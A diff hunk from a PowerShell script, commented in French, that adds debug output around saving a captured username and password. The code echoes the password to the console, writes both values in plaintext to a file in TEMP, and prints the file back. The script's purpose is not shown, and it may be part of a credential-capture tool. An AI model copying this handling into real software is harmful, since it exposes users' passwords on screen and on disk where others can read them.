@@ -113,11 +113,35 @@ Write-Host "Username: $($creds.Username)" -ForegroundColor Yellow
 Write-Host "Password: $($creds.Password)" -ForegroundColor Yellow
 
 #----------------------------------------------------------------------------------------------------
-# SAUVEGARDE DANS TEMP
+# SAUVEGARDE DANS TEMP - AVEC DÉBOGAGE
 
-$credString = "Username: $($creds.Username)`r`nPassword: $($creds.Password)"
-$credString | Out-File -FilePath $filePath -Encoding UTF8 -Force
-Write-Host "Fichier sauvegardé: $filePath" -ForegroundColor Green
+Write-Host "DEBUG: Avant sauvegarde" -ForegroundColor Cyan
+Write-Host "DEBUG: filePath = $filePath" -ForegroundColor Cyan
+Write-Host "DEBUG: Username = $($creds.Username)" -ForegroundColor Cyan
+Write-Host "DEBUG: Password = $($creds.Password)" -ForegroundColor Cyan
+
+try {
+    $credString = "Username: $($creds.Username)`r`nPassword: $($creds.Password)"
+    Write-Host "DEBUG: credString créé = $credString" -ForegroundColor Cyan
+    
+    Write-Host "DEBUG: Avant Out-File" -ForegroundColor Cyan
+    $credString | Out-File -FilePath $filePath -Encoding UTF8 -Force -ErrorAction Stop
+    Write-Host "DEBUG: Après Out-File" -ForegroundColor Cyan
+    
+    # Vérifier que le fichier existe bien
+    if (Test-Path $filePath) {
+        Write-Host "✓ Fichier créé avec succès: $filePath" -ForegroundColor Green
+        $fileContent = Get-Content $filePath
+        Write-Host "✓ Contenu du fichier:" -ForegroundColor Green
+        Write-Host $fileContent -ForegroundColor Green
+    }
+    else {
+        Write-Host "✗ ERREUR: Le fichier n'a pas été créé!" -ForegroundColor Red
+    }
+}
+catch {
+    Write-Host "✗ ERREUR lors de la sauvegarde: $_" -ForegroundColor Red
+}
 
 #----------------------------------------------------------------------------------------------------
 
